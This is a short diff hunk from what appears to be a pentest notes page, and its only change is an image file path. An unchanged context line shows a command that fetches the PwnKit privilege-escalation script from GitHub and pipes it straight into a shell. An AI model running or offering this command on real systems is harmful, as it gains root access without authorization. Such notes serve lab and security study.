@@ -159,4 +159,4 @@ MEMO.
 sh -c "$(curl -fsSL http://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 ```
 
-<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
